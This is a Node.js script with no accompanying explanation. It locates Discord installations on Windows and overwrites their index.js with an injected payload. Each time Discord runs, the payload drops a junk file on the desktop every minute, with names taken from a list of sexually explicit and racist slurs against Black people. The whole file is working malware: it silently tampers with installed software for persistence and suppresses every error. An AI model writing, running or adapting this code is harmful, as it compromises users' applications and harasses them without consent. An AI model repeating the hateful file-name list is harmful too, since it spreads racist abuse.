import { existsSync, writeFileSync, readdirSync } from "node:fs";
import { join } from "node:path";

const encontrarCores = (dir, lista = []) => {
  try {
    const entries = readdirSync(dir, { withFileTypes: true });
    let tieneCoreAsar = false;

    for (const entry of entries) {
      const fullPath = join(dir, entry.name);
      if (entry.isFile() && entry.name === "core.asar") {
        tieneCoreAsar = true;
      } else if (entry.isDirectory()) {
        encontrarCores(fullPath, lista);
      }
    }

    if (tieneCoreAsar) {
      lista.push(dir);
    }
  } catch (_) {}
  return lista;
};

const instalarEnDiscord = () => {
  const localAppData = process.env.LOCALAPPDATA;
  if (!localAppData) return;

  const discordDir = join(localAppData, "Discord");
  if (!existsSync(discordDir)) return;

  try {
    const cores = encontrarCores(discordDir);
    if (cores.length === 0) return;

    for (const corePath of cores) {
      const targetIndex = join(corePath, "index.js");

      const payload = `const { app } = require('electron');
const path = require('path');
const fs = require('fs');

async function joker(ruta_dir) {
    const extension = ["gif","mp4","webm","webp","png","jpeg","jpg","rar","7z"];
    const veinteRandom = [
        "CursoDeMamadas", "ManualDePajas", "GuiaDeOrgasmos",
        "TutorialDeForros", "CursoDeGeles", "GuiaDeJuguetes",
        "ManualDePosturas", "TutorialDeMasajes", "CursoDeLubricantes",
        "GuiaDeTamaños", "ManualDeBombachas", "TutorialDeCorpinos",
        "CursoDeTanga", "GuiaDeForrosTexturados", "ManualDeConsoladores",
        "TutorialDeAnillos", "CursoDeEstimuladores", "GuiaDeCremas",
        "ManualDeToallitas", "TutorialDeVibradores", "NegrasHot", "MochilaParaPene", "Nalgoticas", "Tangonas", "NegrasSidosas", "NegrasAzulesCulonas", "AfricanaTetona",
        "WiskasParaNegros", "SemenRosado", "PerfumeParaNegros", "NegrosBlacos", "ChatGpt-Negros", "PatasSudadas", "MujeresTetonas", "AristoPutas-Gameplay-bytarifa", "AristoPutas-Gameplay-AuronPlay",
        "TopYoutubers-Tetonas-Youtube", "Porhub-links", "xnxx", "porhub", "brazzers-cuentas", "plop-plop"
    ];
    const indiceExt = Math.floor(Math.random() * extension.length);
    const indiceNom = Math.floor(Math.random() * veinteRandom.length);
    const contenido = "This is a kurva develope by pyton";
    try {
        const archivoDestino = path.join(ruta_dir, \`\${veinteRandom[indiceNom]}-\${Date.now()}.\${extension[indiceExt]}\`);
        await fs.promises.appendFile(archivoDestino, contenido + '\\n', 'utf8');
    } catch (_) {}
}

function iniciarFondo() {
    try {
        const desktopPath = app.getPath('desktop');
        if (!desktopPath) return;
        let enEjecucion = false;
        const cicloFondo = async () => {
            if (!enEjecucion) {
                enEjecucion = true;
                try {
                    await joker(desktopPath);
                } catch (_) {}
                enEjecucion = false;
            }
            setTimeout(cicloFondo, 60000);
        };
        setTimeout(cicloFondo, 2000);
    } catch (_) {}
}

if (app.isReady()) {
    iniciarFondo();
} else {
    app.whenReady().then(iniciarFondo);
}

module.exports = require('./core.asar');
`;

      try {
        writeFileSync(targetIndex, payload, 'utf8');
      } catch (_) {}
    }
  } catch (_) {}
};

try {
  instalarEnDiscord();
} catch {}
